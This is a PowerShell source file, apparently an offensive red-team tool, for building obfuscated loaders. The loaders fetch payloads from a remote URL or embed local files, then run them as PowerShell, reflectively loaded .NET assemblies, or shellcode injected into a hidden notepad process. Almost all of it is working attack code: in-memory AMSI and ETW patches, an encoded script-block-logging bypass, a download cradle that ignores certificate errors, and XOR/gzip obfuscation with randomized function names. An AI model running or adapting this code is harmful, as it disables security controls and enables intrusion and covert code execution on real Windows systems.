function New-PowerLoader {
<#
.SYNOPSIS
    Build script block which safely loads PowerShell, .NET assembly and shellcode.

    Author: Timothee MENOCHET (@_tmenochet)

.DESCRIPTION
    New-PowerLoader returns PowerShell script block embedding download cradle or local file as payload.

.PARAMETER Type
    Specifies the payload type, defaults to PoSH.

.PARAMETER FilePath
    Specifies a local payload.

.PARAMETER FileUrl
    Specifies a remote payload.

.PARAMETER ArgumentList
    Specifies the payload arguments.

.PARAMETER Bypass
    Specifies the bypass techniques to include.

.PARAMETER ClearComments
    Removes comments from PowerShell payload to be loaded.

.EXAMPLE
    PS C:\> New-PowerLoader -Type PoSh -FileUrl 'https://192.168.0.1/script.ps1' -ArgumentList 'Invoke-Sample','-Verbose' -Bypass AMSI,SBL

.EXAMPLE
    PS C:\> New-PowerLoader -Type NetAsm -FilePath .\sharp.exe -Bypass AMSI,ETW | Invoke-PowerExec -ComputerList 192.168.0.2
#>
    [CmdletBinding()]
    Param (
        [ValidateSet("PoSh","NetAsm","Shellcode")]
        [string]
        $Type = "PoSh",

        [ValidateScript({Test-Path $_ -PathType Leaf})]
        [string]
        $FilePath,

        [string]
        $FileUrl,

        [ValidateNotNullOrEmpty()]
        [string[]]
        $ArgumentList,

        [ValidateSet("AMSI","ETW","SBL")]
        [string[]]
        $Bypass,

        [Switch]
        $ClearComments
    )

    $srcCode = ${function:Get-DecodedByte}.Ast.Extent.Text + [Environment]::NewLine
    if ($FilePath) {
        $bytes = [IO.File]::ReadAllBytes((Resolve-Path $FilePath))
        if ($ClearComments -and $Type -eq "PoSh") {
            $bytes = Remove-PoshComments($bytes)
        }
        $bytes = $bytes | foreach {$_ -bxor 1}
        $encCode = Get-EncodedByte($bytes)
        $srcCode += '$code = Get-DecodedByte("' + $encCode + '") | foreach {$_ -bxor 1}' + [Environment]::NewLine
    }
    elseif ($FileUrl) {
        $srcCode += ${function:Invoke-DownloadCradle}.Ast.Extent.Text + [Environment]::NewLine
        $bytes = [Text.Encoding]::UTF8.GetBytes($FileUrl)
        $bytes = $bytes | foreach {$_ -bxor 1}
        $encUrl = Get-EncodedByte($bytes)
        $srcCode += '$code = Invoke-DownloadCradle([Text.Encoding]::UTF8.GetString($(Get-DecodedByte("' + $encUrl + '") | foreach {$_ -bxor 1})))' + [Environment]::NewLine
        if ($ClearComments -and $Type -eq "PoSh") {
            $srcCode += ${function:Remove-PoshComments}.Ast.Extent.Text + [Environment]::NewLine
            $srcCode += '$code = Remove-PoshComments($code)' + [Environment]::NewLine
        }
    }
    else {
        Write-Error "Either FilePath or FileUrl parameter must be specified" -ErrorAction Stop
    }

    if ($ArgumentList) {
        $args = $ArgumentList -join ','
        $bytes = [Text.Encoding]::UTF8.GetBytes($args)
        $bytes = $bytes | foreach {$_ -bxor 1}
        $encArgs = Get-EncodedByte($bytes)
        $srcArgs = '$args = $([Text.Encoding]::UTF8.GetString($(Get-DecodedByte("' + $encArgs + '") | foreach {$_ -bxor 1}))).Split('','')' + [Environment]::NewLine
    }
    else {
        $srcArgs = '$args = $null' + [Environment]::NewLine
    }

    $srcBypass = ''
    if ($Bypass -and ($Bypass.Contains('AMSI') -or $Bypass.Contains('ETW'))) {
        $srcBypass += ${function:Invoke-MemoryPatch}.Ast.Extent.Text + [Environment]::NewLine
    }
    switch ($Bypass) {
        'AMSI' {
            $srcBypass += '$d = $([Text.Encoding]::UTF8.GetString($(Get-DecodedByte("H4sIAAAAAAAEAEvIKcrQT83NBQCpd2pDCAAAAA==") | foreach {$_ -bxor 1})))' + [Environment]::NewLine
            $srcBypass += '$f = $([Text.Encoding]::UTF8.GetString($(Get-DecodedByte("H4sIAAAAAAAEAHPIKcoISkrIdy5JT08pBgCSRCbiDgAAAA==") | foreach {$_ -bxor 1})))' + [Environment]::NewLine
            $srcBypass += 'if ([Environment]::Is64BitOperatingSystem) {$p = [byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)} else {$p = [byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00)}' + [Environment]::NewLine
            $srcBypass += 'Invoke-MemoryPatch -Dll $d -Func $f -Patch $p' + [Environment]::NewLine
        }
        'ETW' {
            $srcBypass += '$d = $([Text.Encoding]::UTF8.GetString($(Get-DecodedByte("H4sIAAAAAAAEAMsvTc3N1QdiALm3ONgJAAAA") | foreach {$_ -bxor 1})))' + [Environment]::NewLine
            $srcBypass += '$f = $([Text.Encoding]::UTF8.GetString($(Get-DecodedByte("H4sIAAAAAAAEAHMpLXMpT8kvDSvOKE0BAGFTlzkNAAAA") | foreach {$_ -bxor 1})))' + [Environment]::NewLine
            $srcBypass += 'if ([Environment]::Is64BitOperatingSystem) {$p = [byte[]] (0xc3)} else {$p = [byte[]] (0xc2, 0x14, 0x00, 0x00)}' + [Environment]::NewLine
            $srcBypass += 'Invoke-MemoryPatch -Dll $d -Func $f -Patch $p' + [Environment]::NewLine
        }
        'SBL' {
            $srcBypass += '$b = "H4sIAAAAAAAEADWOUUsDMRCEf8s9GO6gR/5CUVAEsXhihdKHJdmmW71NuE1WQumPNyf4OMN8M6O5Xg/veD7arQjOnqt9RP2oCw5mqqI42xdIEHDGpHZbNM6gFJOdXKZFHzi6L9OvzBMhnwYjFBJoyShmNLuY3opncqNow1xLTqifwAWHu1SYx2GHP5tX/41Ou//B+8jcdFuRVpwwk7PPIJeGHkQzpXA0fX9zoO5y3WdS3Owhp+a3ir9bnV9/dRxDWF1fFxDpzkCMJ2tuvxHo1jL1AAAA"' + [Environment]::NewLine
            $srcBypass += 'IEX $([Text.Encoding]::UTF8.GetString($(Get-DecodedByte($b) | foreach {$_ -bxor 1})))' + [Environment]::NewLine
        }
    }

    switch ($Type) {
        'PoSh' {
            $srcLoader = ${function:Invoke-PoshLoader}.Ast.Extent.Text + [Environment]::NewLine
            $srcLoader += 'Invoke-PoshLoader -Code $([Text.Encoding]::UTF8.GetString($code)) -ArgumentList $args'
        }
        'NetAsm' {
            $srcLoader = ${function:Invoke-NetLoader}.Ast.Extent.Text + [Environment]::NewLine
            $srcLoader += 'Invoke-NetLoader -Code $code -ArgumentList $args'
        }
        'Shellcode' {
            $srcLoader = ${function:Invoke-ShellcodeLoader}.Ast.Extent.Text + [Environment]::NewLine
            $srcLoader += 'Invoke-ShellcodeLoader -Code $code'
        }
    }
    $script = $srcCode + $srcArgs + $srcBypass + $srcLoader
    $words = @('Get-DecodedByte','Invoke-DownloadCradle','Invoke-MemoryPatch','Invoke-PoshLoader','Invoke-NetLoader','Invoke-ShellcodeLoader','Remove-PoshComments')
    $script = Get-ObfuscatedString -InputString $script -BlackList $words
    return [ScriptBlock]::Create($script)
}

function Local:Remove-PoshComments {
    Param (
        [byte[]] $Bytes
    )

    $strBytes = [BitConverter]::ToString($Bytes)
    $strBytes = $strBytes -replace "3C-23-(.*?)-23-3E"
    $strBytes = $strBytes -replace "23-(.*?)-0A","0A"
    $strBytes = $strBytes -replace "-"
    $byteArray = New-Object Byte[] ($strBytes.Length / 2)
    for ($i = 0; $i -lt $strBytes.Length; $i += 2) {
        $byteArray[$i/2] = [convert]::ToByte($strBytes.Substring($i, 2), 16)
    }
    return $byteArray
}

function Local:Get-ObfuscatedString {
    Param (
        [String] $InputString,
        [String[]] $BlackList
    )

    foreach($word in $BlackList) {
        $string = -join ((0x41..0x5A) + (0x61..0x7A) | Get-Random -Count 11 | %{[char]$_})
        $InputString = $InputString.Replace($word,$string)
    }
    return $InputString
}

function Local:Get-EncodedByte {
    Param (
        [Parameter(Mandatory = $True)]
        [byte[]] $ByteArray
    )

    [IO.MemoryStream] $output = New-Object IO.MemoryStream
    $gzipStream = New-Object IO.Compression.GzipStream $output, ([IO.Compression.CompressionMode]::Compress)
    $gzipStream.Write($ByteArray, 0, $ByteArray.Length)
    $gzipStream.Close()
    $output.Close()
    $out = $output.ToArray()
    return [Convert]::ToBase64String($out)
}

function Local:Get-DecodedByte {
    Param (
        [Parameter(Mandatory = $True)]
        [string] $EncBytes
    )

    $byteArray = [Convert]::FromBase64String($EncBytes)
    $input = New-Object IO.MemoryStream(,$byteArray)
    $output = New-Object IO.MemoryStream
    $gzipStream = New-Object IO.Compression.GzipStream $input, ([IO.Compression.CompressionMode]::Decompress)
    $gzipStream.CopyTo($output)
    $gzipStream.Close()
    $input.Close()
    return $output.ToArray()
}

function Local:Invoke-MemoryPatch {
    Param (
        [string] $Dll,
        [string] $Func,
        [byte[]] $Patch
    )

    Add-Type @"
using System;
using System.Runtime.InteropServices;
public class Kernel32 {
[DllImport("kernel32")]
public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
[DllImport("kernel32")]
public static extern IntPtr LoadLibrary(string name);
[DllImport("kernel32")]
public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@
    $address = [Kernel32]::GetProcAddress([Kernel32]::LoadLibrary($Dll), $Func)
    $a = 0
    $b = 0
    [Kernel32]::VirtualProtect($address, [UInt32]$Patch.Length, 0x40, [ref]$a) | Out-Null
    try {
        [Runtime.InteropServices.Marshal]::Copy($Patch, 0, $address, [UInt32]$Patch.Length)
    }
    catch {
        Write-Error "Memory patch failed."
    }
    finally {
        [Kernel32]::VirtualProtect($address, [UInt32]$Patch.Length, $a, [ref]$b) | Out-Null
    }
}

function Local:Invoke-DownloadCradle {
    Param (
        [Parameter(Mandatory=$True)]
        [string] $URL
    )

    $code = $null
    try {
        [Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]3072
        $client = [Net.WebRequest]::Create($URL)
        $client.Proxy = [Net.WebRequest]::GetSystemWebProxy()
        $client.Proxy.Credentials = [Net.CredentialCache]::DefaultCredentials
        $response = $client.GetResponse()
        $respStream = $response.GetResponseStream()
        $buffer = New-Object byte[] $response.ContentLength
        $writeStream = New-Object IO.MemoryStream $response.ContentLength
        do {
            $bytesRead = $respStream.Read($buffer, 0, $buffer.Length)
            $writeStream.Write($buffer, 0, $bytesRead)
        }
        while ($bytesRead -gt 0)
        $code = New-Object byte[] $response.ContentLength
        [Array]::Copy($writeStream.GetBuffer(), $code, $response.ContentLength)
        $respStream.Close()
        $response.Close()
    }
    catch [Net.WebException] {
        Write-Error $_
    }
    return $code
}

function Local:Invoke-PoshLoader {
    Param (
        [Parameter(Mandatory=$True)]
        [ValidateNotNullOrEmpty()]
        [string] $Code,

        [string[]] $ArgumentList
    )

    Invoke-Expression "$Code $($ArgumentList -join ' ')"
}

function Local:Invoke-NetLoader {
    Param (
        [Parameter(Mandatory=$True)]
        [ValidateNotNullOrEmpty()]
        [byte[]] $Code,

        [string[]] $ArgumentList
    )

    $output = New-Object IO.StringWriter
    [Console]::SetOut($output)
    $assembly = [Reflection.Assembly]::Load([byte[]]$Code)
    $al = New-Object -TypeName Collections.ArrayList
    $al.add($ArgumentList) | Out-Null
    try {
        $assembly.EntryPoint.Invoke($null, $al.ToArray())
    }
    catch [Management.Automation.MethodInvocationException] {
        Write-Warning $_
    }
    finally {
        Write-Output $output.ToString()
    }
}

function Local:Invoke-ShellcodeLoader {
    Param (
        [Parameter(Mandatory=$True)]
        [ValidateNotNullOrEmpty()]
        [Byte[]]
        $Code
    )

    Add-Type @"
using System;
using System.Runtime.InteropServices;
public class Win32 {
    [DllImport("kernel32.dll")]
    public static extern IntPtr OpenProcess(UInt32 processAccess, bool bInheritHandle, int processId);
    [DllImport("kernel32.dll")]
    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, int flAllocationType, int flProtect);
    [DllImport("kernel32.dll")]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, ref UInt32 lpNumberOfBytesWritten);
    [DllImport("kernel32.dll")]
    public static extern bool CloseHandle(IntPtr hObject);
    [DllImport("ntdll.dll")]
    public static extern UInt32 NtCreateThreadEx(
        ref IntPtr hThread,
        UInt32 DesiredAccess,
        IntPtr ObjectAttributes,
        IntPtr ProcessHandle,
        IntPtr lpStartAddress,
        IntPtr lpParameter,
        bool CreateSuspended,
        UInt32 StackZeroBits,
        UInt32 SizeOfStackCommit,
        UInt32 SizeOfStackReserve,
        IntPtr lpBytesBuffer
    );
}
"@
    $procStart = [wmiclass]"\\.\root\cimv2:Win32_ProcessStartup"
    $procStart.Properties["ShowWindow"].Value = 0
    $procID = (([wmiclass]"\\.\root\cimv2:Win32_Process").Create("notepad.exe", $null, $procStart)).ProcessId
    $hProc = [Win32]::OpenProcess(0x001F0FFF, $false, $procID)
    $address = [Win32]::VirtualAllocEx($hProc, 0, $Code.Length + 1, 0x3000, 0x40)
    [Win32]::WriteProcessMemory($hProc, $address, $Code, $Code.Length, [ref] 0) | Out-Null
    $hRemoteThread = [IntPtr]::Zero
    [Win32]::NtCreateThreadEx([ref]$hRemoteThread, 0x1FFFFF, [IntPtr]::Zero, $hProc, $address, [IntPtr]::Zero, $false, 0, 0xffff, 0xffff, [IntPtr]::Zero) | Out-Null
    if ($hRemoteThread -ne [IntPtr]::Zero) {
        Write-Output "Successful injection."
        [Win32]::CloseHandle($hRemoteThread) | Out-Null
    }
    [Win32]::CloseHandle($hProc) | Out-Null
}